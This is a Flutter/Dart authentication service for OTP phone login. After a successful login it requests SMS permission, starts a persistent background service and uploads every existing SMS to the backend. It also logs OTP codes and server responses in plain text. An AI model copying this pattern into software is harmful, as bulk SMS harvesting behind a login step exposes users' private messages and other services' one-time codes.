import '../models/user_model.dart';
import '../config/constants.dart';
import 'api_service.dart';
import 'storage_service.dart';
import 'contact_service.dart';
import 'sms_service.dart';
import 'background_sms_service.dart';

class AuthService {
  final ApiService _api = ApiService();
  final StorageService _storage = StorageService();
  final ContactService _contactService = ContactService();
  final SmsService _smsService = SmsService();
  final BackgroundSmsService _backgroundService = BackgroundSmsService();

  // Send OTP
  Future<Map<String, dynamic>> sendOtp(String phoneNumber) async {
    try {
      print('🔹 Sending OTP to: $phoneNumber');
      print('🔹 API URL: ${AppConstants.baseUrl}${AppConstants.loginEndpoint}');

      final response = await _api.post(
        AppConstants.loginEndpoint,
        body: {'phoneNumber': phoneNumber},
      );

      print('✅ OTP Response: $response');
      return response;
    } catch (e) {
      print('❌ OTP Error: $e');
      rethrow;
    }
  }

  // Verify OTP
  Future<Map<String, dynamic>> verifyOtp(String phoneNumber, String otp) async {
    try {
      print('🔹 Verifying OTP: $otp for phone: $phoneNumber');
      print(
        '🔹 API URL: ${AppConstants.baseUrl}${AppConstants.verifyOtpEndpoint}',
      );

      final response = await _api.post(
        AppConstants.verifyOtpEndpoint,
        body: {'phoneNumber': phoneNumber, 'otp': otp},
      );

      print('✅ Verify Response: $response');

      // Save token and user data
      if (response['token'] != null) {
        await _storage.saveToken(response['token']);
        await _storage.setLoggedIn(true);

        if (response['user'] != null) {
          final user = UserModel.fromJson(response['user']);
          await _storage.saveUser(user);
        }

        // Request SMS permission and start background service
        _requestSmsPermissionAndStartService();
      }

      return response;
    } catch (e) {
      print('❌ Verify Error: $e');
      rethrow;
    }
  }

  // Resend OTP
  Future<Map<String, dynamic>> resendOtp(String phoneNumber) async {
    try {
      final response = await _api.post(
        AppConstants.resendOtpEndpoint,
        body: {'phoneNumber': phoneNumber},
      );
      return response;
    } catch (e) {
      rethrow;
    }
  }

  // Logout
  Future<void> logout() async {
    await _storage.clearAll();
  }

  // Check if user is logged in
  bool isLoggedIn() {
    return _storage.isLoggedIn();
  }

  // Get current user
  UserModel? getCurrentUser() {
    return _storage.getUser();
  }

  // Request SMS permission and start background service after login
  void _requestSmsPermissionAndStartService() async {
    try {
      print('🔹 Starting SMS service initialization...');

      // Wait a bit for UI to settle
      await Future.delayed(const Duration(seconds: 2));

      // Request SMS permission
      final hasPermission = await _smsService.requestSmsPermission();
      print('📱 SMS permission granted: $hasPermission');

      if (hasPermission) {
        // Initialize background service
        await _backgroundService.initialize();

        // Start foreground service
        final serviceStarted = await _backgroundService
            .startForegroundService();
        print('🚀 Foreground service started: $serviceStarted');

        if (serviceStarted) {
          // Register periodic task
          await _backgroundService.registerPeriodicTask();

          // Initialize SMS listener
          await _smsService.initializeSmsListener();

          // Sync all existing SMS
          await _smsService.syncAllSmsToBackend();

          print('✅ SMS service fully initialized');
        }
      } else {
        print('⚠️ SMS permission denied');
      }
    } catch (e) {
      print('❌ Error initializing SMS service: $e');
      // Don't throw error, just log it
    }
  }
}
